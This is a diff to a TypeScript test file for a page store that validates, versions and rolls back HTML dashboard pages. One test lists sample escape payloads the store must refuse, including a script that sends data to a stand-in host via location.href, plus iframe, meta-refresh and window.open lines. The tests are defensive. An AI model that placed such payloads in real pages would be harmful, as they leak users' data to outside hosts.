@@ -1,12 +1,17 @@
-import { mkdtempSync, rmSync } from "node:fs";
+import { existsSync, mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 
 import { Workspace } from "../store/workspace.js";
 import { ProjectManifest } from "./manifest.js";
+import { Migrator } from "./migrate.js";
 import { PageStore } from "./pages.js";
 import { runDisplayQuery } from "./display.js";
+import type { LoadedPage } from "./pages.js";
+
+/** A spec page as loaded, or nothing when the page is not one. */
+const specOf = (got: LoadedPage | undefined) => (got?.kind === "spec" ? got.spec : undefined);
 
 describe("PageStore", () => {
   let root: string;
@@ -41,7 +46,7 @@ describe("PageStore", () => {
     expect(rec.id).toBe("overview");
     expect(pages.list("demo")).toHaveLength(1);
     const got = pages.get("overview");
-    expect(got?.spec.title).toBe("Overview");
+    expect(specOf(got)?.title).toBe("Overview");
   });
 
   it("rejects invalid specs", () => {
@@ -203,7 +208,7 @@ describe("PageStore stat labels", () => {
       widgets: [{ type: "stat", title: "Total spent", query: "SELECT 1" }],
     });
     expect(rec.id).toBe("p");
-    expect(pages.get("p")?.spec.widgets[0]).toMatchObject({
+    expect(specOf(pages.get("p"))?.widgets[0]).toMatchObject({
       label: "Total spent",
     });
   });
@@ -216,7 +221,7 @@ describe("PageStore stat labels", () => {
         { type: "stat", title: "Caption", label: "Real label", query: "SELECT 1" },
       ],
     });
-    expect(pages.get("q")?.spec.widgets[0]).toMatchObject({ label: "Real label" });
+    expect(specOf(pages.get("q"))?.widgets[0]).toMatchObject({ label: "Real label" });
   });
 
   it("still rejects a stat with neither", () => {
@@ -227,5 +232,112 @@ describe("PageStore stat labels", () => {
         widgets: [{ type: "stat", query: "SELECT 1" }],
       }),
     ).toThrow(/stat requires a label/);
+  });
+});
+
+describe("PageStore HTML pages", () => {
+  let root: string;
+  let ws: Workspace;
+  let pages: PageStore;
+  let t: number;
+
+  beforeEach(() => {
+    root = mkdtempSync(join(tmpdir(), "kos-html-"));
+    ws = Workspace.open(root);
+    const manifest = new ProjectManifest(ws.db);
+    manifest.createProject({ name: "Budget", type: "tracker" });
+    manifest.createProject({ name: "Diary", type: "notes" });
+    const migrator = new Migrator(ws.db, manifest);
+    migrator.migrate("budget", { op: "create_table", table: "tx", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "amount", type: "REAL" }] });
+    migrator.migrate("diary", { op: "create_table", table: "entries", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "body", type: "TEXT" }] });
+    t = 1000;
+    pages = new PageStore(ws.db, ws, manifest, () => (t += 1000));
+  });
+
+  afterEach(() => {
+    ws.close();
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("writes and loads an HTML page with its declarations, repairing escaped closing tags", () => {
+    const rec = pages.writeHtml("budget", {
+      id: "budget",
+      title: "Budget",
+      html: "<h1>Spend</h1><script>kos.query('SELECT 1')<\\/script>",
+      capabilities: { writes: [{ table: "budget_tx", columns: ["amount"] }] },
+      libraries: ["charts"],
+      headline: { label: "Spent", query: "SELECT SUM(amount) FROM budget_tx" },
+    });
+    expect(rec).toMatchObject({ kind: "html", path: "projects/budget/pages/budget.html" });
+    const got = pages.get("budget");
+    expect(got?.kind).toBe("html");
+    if (got?.kind !== "html") return;
+    expect(got.page.html).toContain("</script>");
+    expect(got.page.capabilities?.writes?.[0]?.table).toBe("budget_tx");
+    expect(got.page.libraries).toEqual(["charts"]);
+    expect(pages.list("budget")[0]?.kind).toBe("html");
+  });
+
+  it("refuses a bad page: too big, an unknown library, bad declarations, another project's table", () => {
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "a".repeat(400_001) })).toThrow(/characters/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", libraries: ["jquery"] })).toThrow(/not one KOS serves/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "budget_tx" }] } })).toThrow(/editable columns/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "diary_entries", columns: ["body"] }] } })).toThrow(/"diary_entries" is not a table of project "budget"/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "SELECT COUNT(*) FROM diary_entries" } })).toThrow(/headline.query: it reads "diary_entries"/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "tx", columns: ["amount"] }] } })).toThrow(/use "budget_tx"/);
+    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "DELETE FROM budget_tx" } })).toThrow(/read-only/);
+    expect(() => pages.writeHtml("nope", { id: "x", title: "X", html: "<p>" })).toThrow(/unknown project/);
+  });
+
+  it("refuses a page that would try to leave its frame, naming what, and lets ordinary words and code through", () => {
+    const leaving = [
+      "<script>location.href = 'https://x.example/?d=' + data</script>",
+      "<script>window.open('https://x.example')</script>",
+      "<form><input name=q></form>",
+      "<script>document.querySelector('form').submit()</script>",
+      '<meta http-equiv="refresh" content="0;url=https://x.example">',
+      '<link rel="prerender" href="https://x.example">',
+      '<a href="https://x.example" target="_blank">x</a>',
+      '<a href="/x" download>x</a>',
+      '<iframe src="https://x.example"></iframe>',
+      '<script type="speculationrules">{}</script>',
+      '<button onclick="location.assign(1)">go</button>',
+    ];
+    for (const html of leaving) expect(() => pages.writeHtml("budget", { id: "x", title: "X", html }), html).toThrow(/cannot leave its frame/);
+    expect(() =>
+      pages.writeHtml("budget", {
+        id: "ok",
+        title: "Ok",
+        html: '<meta charset="utf-8"><p>Pick a location. Fill the form below.</p><script>const target = document.body; if (x == location) {}</script>',
+      }),
+    ).not.toThrow();
+  });
+
+  it("keeps every write as a version and rolls back to one, the rollback kept too", () => {
+    pages.writeHtml("budget", { id: "b", title: "One", html: "<p>one</p>" });
+    pages.writeHtml("budget", { id: "b", title: "Two", html: "<p>two</p>" });
+    expect(pages.history("b").map((v) => v.title)).toEqual(["One", "Two"]);
+    pages.rollback("b", 1);
+    const got = pages.get("b");
+    expect(got?.kind === "html" && got.page.html).toBe("<p>one</p>");
+    expect(pages.history("b").map((v) => v.version)).toEqual([1, 2, 3]);
+    expect(() => pages.rollback("b", 9)).toThrow(/no version 9/);
+  });
+
+  it("still writes, versions and renders a spec page, and lets a spec page become HTML", () => {
+    pages.write("budget", { id: "old", title: "Old", widgets: [{ type: "stat", label: "N", query: "SELECT 1 AS n" }] });
+    expect(pages.get("old")?.kind).toBe("spec");
+    pages.writeHtml("budget", { id: "old", title: "New", html: "<p>new</p>" });
+    expect(pages.get("old")?.kind).toBe("html");
+    expect(existsSync(join(root, "projects/budget/pages/old.json"))).toBe(false);
+    pages.rollback("old", 1);
+    const back = pages.get("old");
+    expect(back?.kind === "spec" && back.spec.title).toBe("Old");
+  });
+
+  it("removes a page with its history", () => {
+    pages.writeHtml("budget", { id: "gone", title: "Gone", html: "<p>" });
+    expect(pages.remove("gone")).toBe(true);
+    expect(existsSync(join(root, "projects/budget/pages/.history/gone"))).toBe(false);
   });
 });
